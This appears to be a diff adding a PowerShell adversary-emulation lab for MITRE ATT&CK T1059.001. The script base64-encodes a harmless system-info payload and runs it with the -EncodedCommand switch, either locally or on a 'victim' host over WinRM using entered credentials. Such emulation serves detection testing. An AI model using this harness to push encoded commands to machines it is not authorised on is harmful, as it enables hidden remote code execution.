@@ -1,0 +1,91 @@
+param(
+    [Parameter(Mandatory = $true)]
+    [string]$Victim,
+
+    [ValidateSet("E", "EC", "Enc", "EncodedCommand")]
+    [string]$EncodedCommandParamVariation = "E",
+
+    [switch]$LocalOnly
+)
+
+$ErrorActionPreference = "Stop"
+
+Write-Host "MITRE ATT&CK T1059.001 - PowerShell EncodedCommand Lab" -ForegroundColor Cyan
+
+
+$Payload = @'
+$OutputFile = Join-Path $env:TEMP "T1059_001_EncodedCommand_Demo.txt"
+"User: $(whoami)" | Add-Content -Path $OutputFile
+"ComputerName: $env:COMPUTERNAME" | Add-Content -Path $OutputFile
+"PowerShellVersion: $($PSVersionTable.PSVersion)" | Add-Content -Path $OutputFile
+
+Write-Host "T1059.001 EncodedCommand demo completed."
+Write-Host "Output file: $OutputFile"
+'@
+
+
+$PayloadBytes = [System.Text.Encoding]::Unicode.GetBytes($Payload)
+$EncodedPayload = [Convert]::ToBase64String($PayloadBytes)
+
+$Switch = "-" + $EncodedCommandParamVariation
+
+Write-Host "[+] Victim: $Victim" -ForegroundColor Green
+Write-Host "[+] Switch: $Switch" -ForegroundColor Green
+Write-Host "[+] Encoded payload length: $($EncodedPayload.Length)" -ForegroundColor Green
+
+$FullCommand = "powershell.exe -NoProfile -NonInteractive $Switch $EncodedPayload"
+
+Write-Host ""
+Write-Host "[+] Command preview:" -ForegroundColor Yellow
+Write-Host $FullCommand
+Write-Host ""
+
+if ($LocalOnly) {
+    Write-Host "[+] Running locally..." -ForegroundColor Yellow
+
+    Start-Process `
+        -FilePath "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe" `
+        -ArgumentList "-NoProfile -NonInteractive $Switch $EncodedPayload" `
+        -Wait
+
+    Write-Host "[+] Local demo completed." -ForegroundColor Green
+    exit
+}
+
+Write-Host "[+] Enter credential for victim machine." -ForegroundColor Cyan
+$Cred = Get-Credential
+
+Write-Host "[+] Testing WinRM..." -ForegroundColor Green
+Test-WSMan -ComputerName $Victim | Out-Null
+
+Write-Host "[+] Sending EncodedCommand to victim..." -ForegroundColor Green
+
+Invoke-Command -ComputerName $Victim -Credential $Cred -ScriptBlock {
+    param(
+        [string]$EncodedPayloadFromAttacker,
+        [string]$EncodedSwitchFromAttacker
+    )
+
+    $PowerShellPath = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
+    $ArgumentList = "-NoProfile -NonInteractive $EncodedSwitchFromAttacker $EncodedPayloadFromAttacker"
+
+    Start-Process `
+        -FilePath $PowerShellPath `
+        -ArgumentList $ArgumentList `
+        -Wait
+
+    $OutputFile = Join-Path $env:TEMP "T1059_001_EncodedCommand_Demo.txt"
+
+    if (Test-Path $OutputFile) {
+        Get-Content $OutputFile
+    }
+    else {
+        Write-Host "Output file not found."
+    }
+
+} -ArgumentList $EncodedPayload, $Switch
+
+Write-Host "[+] Remote demo completed." -ForegroundColor Green
+$OutputFile = Join-Path $env:TEMP "T1059_001_EncodedCommand_Demo.txt"
+
+"=== MITRE ATT&CK T1059.001 Demo ===" | Out-File -FilePath $OutputFile -Encoding UTF8
